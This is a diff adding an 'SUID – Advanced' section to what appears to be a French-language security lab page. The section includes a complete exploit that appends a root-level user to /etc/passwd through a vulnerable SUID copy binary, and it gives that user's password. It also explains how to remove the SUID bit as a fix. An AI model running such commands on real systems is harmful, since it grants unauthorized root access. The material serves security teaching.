@@ -1250,7 +1250,66 @@ exec(query.cmd, (err, stdout, stderr) => {
 </p>
 
   </div>
-  <div id="s13" class="content"><div class="section-title">XIII. SUID – Advanced</div></div>
+  <div id="s13" class="content"><div class="section-title">XIII. SUID – Advanced</div>
+  <h3>🧪 Try it out</h3>
+
+<p>Utilisez <code>cat</code>, <code>less</code> ou <code>nano</code> pour consulter le code source :</p>
+
+<pre><code>cat view_file.cpp</code></pre>
+
+<p>Ensuite, exécutez le binaire SUID pour obtenir le flag :</p>
+
+<pre><code>./view_file</code></pre>
+
+<hr>
+
+<h3>🔍 Trouver l’exécutable vulnérable</h3>
+
+<p>
+  Pour réduire votre zone de recherche, comparez les exécutables SUID présents sur votre machine locale 
+  avec ceux du système vulnérable.
+</p>
+
+<p>
+  L’exécutable vulnérable possède aussi un fichier <code>.cpp</code> dans le même répertoire.
+</p>
+
+<p>Emplacement du fichier :</p>
+
+<pre><code>/usr/bin</code></pre>
+
+<hr>
+
+<h3>💥 Exploiter l’exécutable</h3>
+
+<p>Solution complète :</p>
+
+<pre><code>cp /etc/passwd ~/passwd
+echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> ~/passwd
+/usr/bin/copy_file /home/student/passwd /etc/passwd
+su root2
+</code></pre>
+
+<p>
+  Le mot de passe du nouvel utilisateur <code>root2</code> est :
+</p>
+
+<pre><code>mrcake</code></pre>
+
+<hr>
+
+<h3>🛡️ Supprimer le bit SUID (Correction)</h3>
+
+<p>
+  Pour corriger la vulnérabilité, il faut supprimer le bit SUID de l’exécutable :
+</p>
+
+<pre><code>chmod -s &lt;filename&gt;</code></pre>
+
+<p><b>Important :</b>  
+Vous devez exécuter cette commande en tant que propriétaire du fichier, c’est-à-dire <b>root</b>.</p>
+
+  </div>
   <div id="s14" class="content"><div class="section-title">XIV. Metasploit – Advanced</div></div>
   <div id="s15" class="content"><div class="section-title">XV. Reverse Shells – Advanced</div></div>
   <div id="s16" class="content"><div class="section-title">XVI. Exfiltration – Advanced</div></div>
